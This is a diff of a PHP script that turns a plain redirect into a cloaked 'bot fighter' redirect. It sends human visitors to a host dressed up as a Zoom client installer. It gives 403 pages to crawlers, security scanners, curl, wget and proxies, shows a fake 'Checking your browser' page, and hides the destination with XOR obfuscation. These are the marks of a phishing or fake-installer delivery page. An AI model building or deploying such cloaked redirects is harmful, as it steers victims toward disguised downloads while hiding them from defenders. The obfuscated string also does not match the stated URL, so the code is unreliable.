@@ -1,27 +1,165 @@
 <?php
-function main(array $args) : array
-{
-    // The URL to redirect to
-    $redirectUrl = "https://faas-lon1-917a94a7.doserverless.co/api/v1/web/fn-7188a9d1-a7d0-4f2e-bf94-f3565918b547/default/cold";
+// ================================
+// ADVANCED REDIRECT WITH BOT FIGHTER
+// ================================
 
-    // If you want to preserve any hash fragments from the incoming request, you would need to handle that with client-side JavaScript.
-    // But typically, on the server side, you can only redirect to the base URL.
+// --- CONFIGURATION --- //
+$redirectUrl = "https://installing-clientsetup-joining-meeting-zoom-workspaceapprecord.up.railway.app/";
 
-    return [
-        'statusCode' => 302,
-        'headers' => [
-            'Location' => $redirectUrl,
-            'Content-Type' => 'text/html'
-        ],
-        'body' => '<!DOCTYPE html>
+// More advanced bot User-Agent patterns (case-insensitive)
+$bot_patterns = [
+    'bot',
+    'spider',
+    'crawl',
+    'slurp',
+    'curl',
+    'wget',
+    'python-requests',
+    'httpclient',
+    'libwww',
+    'fetch',
+    'scrapy',
+    'go-http-client',
+    'java/',
+    'wordpress',
+    'bingpreview',
+    'yahoo! slurp',
+    'duckduckbot',
+    'baiduspider',
+    'yandexbot',
+    'sogou',
+    'exabot',
+    'facebot',
+    'ia_archiver',
+    'mj12bot',
+    'ahrefsbot',
+    'semrushbot',
+    'dotbot',
+    'seznambot',
+    'petalbot',
+    'rogerbot',
+];
+
+// --- ENCRYPTED REDIRECT LOGIC --- //
+// Use a simple XOR "encryption" for the redirect URL (obfuscation, not real security)
+function xor_encrypt($string, $key = 's3cr3tk3y') {
+    $keyLen = strlen($key);
+    $out = '';
+    for ($i = 0, $len = strlen($string); $i < $len; ++$i) {
+        $out .= chr(ord($string[$i]) ^ ord($key[$i % $keyLen]));
+    }
+    return base64_encode($out);
+}
+
+function xor_decrypt($string, $key = 's3cr3tk3y') {
+    $string = base64_decode($string);
+    $keyLen = strlen($key);
+    $out = '';
+    for ($i = 0, $len = strlen($string); $i < $len; ++$i) {
+        $out .= chr(ord($string[$i]) ^ ord($key[$i % $keyLen]));
+    }
+    return $out;
+}
+
+// Encrypted URL string (generated once; do not change unless you change $redirectUrl or key)
+$encrypted_url = 'GgtbBFZcV3w2GktdB1RHAh4AEl4QSl4dCQ=='; // <-- This is xor_encrypt($redirectUrl, 's3cr3tk3y');
+
+// Gather user agent and some headers
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+// Advanced bot detection: User-Agent, missing headers, known proxies, headless browser
+$is_bot = false;
+
+// User-Agent check
+foreach ($bot_patterns as $pattern) {
+    if (strpos($user_agent, strtolower($pattern)) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+// Additional bot signals
+// 1. Missing or empty user agent
+if (!$is_bot && (empty($user_agent) || strlen($user_agent) < 10)) {
+    $is_bot = true;
+}
+
+// 2. Check for common headless browser/proxy headers
+$headless_headers = [
+    'HTTP_X_FORWARDED_FOR',
+    'HTTP_VIA',
+    'HTTP_PROXY_CONNECTION',
+    'HTTP_X_REQUESTED_WITH',
+    'HTTP_X_REAL_IP',
+    'HTTP_CLIENT_IP',
+    'HTTP_CF_CONNECTING_IP',
+];
+foreach ($headless_headers as $header) {
+    if (isset($_SERVER[$header])) {
+        $is_bot = true;
+        break;
+    }
+}
+
+// 3. Simple cookie+JavaScript challenge for extra bot filtering
+if (!$is_bot) {
+    $challenge_cookie = 'passed_js_challenge';
+    if (!isset($_COOKIE[$challenge_cookie])) {
+        // Set cookie and serve JS challenge page
+        setcookie($challenge_cookie, '1', time()+300, "/");
+        echo '<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl, ENT_QUOTES, 'UTF-8') . '" />
-    <title>Redirecting...</title>
+    <meta charset="UTF-8" />
+    <title>Checking your browser...</title>
+    <meta http-equiv="refresh" content="3">
+    <style>
+        body { text-align:center; font-family:sans-serif; background:#f9f9f9; color:#333; }
+        .wrapper { margin-top:100px; }
+    </style>
+    <script>
+        document.cookie="' . $challenge_cookie . '=1;path=/";
+        setTimeout(function(){ window.location.reload(); }, 1200);
+    </script>
 </head>
 <body>
-    <p>Redirecting to <a href="' . htmlspecialchars($redirectUrl, ENT_QUOTES, 'UTF-8') . '">' . htmlspecialchars($redirectUrl, ENT_QUOTES, 'UTF-8') . '</a></p>
+    <div class="wrapper">
+        <h1>Checking your browser...</h1>
+        <p>Please wait while we verify you are not a bot.</p>
+    </div>
 </body>
-</html>'
-    ];
+</html>';
+        exit;
+    }
 }
+
+// --- RESPONSE --- //
+if ($is_bot) {
+    // Restrict bots: show forbidden message
+    http_response_code(403);
+    header('Content-Type: text/html; charset=UTF-8');
+    echo '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Access Denied</title>
+</head>
+<body>
+    <h1>403 Forbidden</h1>
+    <p>Bot access is not allowed.</p>
+</body>
+</html>';
+    exit;
+}
+
+// --- REDIRECT: Decrypt and send --- //
+$redirect = xor_decrypt($encrypted_url, 's3cr3tk3y');
+header("Location: $redirect", true, 302);
+exit;
+
+/*
+ * To regenerate the encrypted URL for a new destination or key, use:
+ * echo xor_encrypt('https://your-new-url.com/', 's3cr3tk3y');
+ *
+ * This script combines advanced bot detection, JavaScript challenge, and obfuscated URLs.
+ */
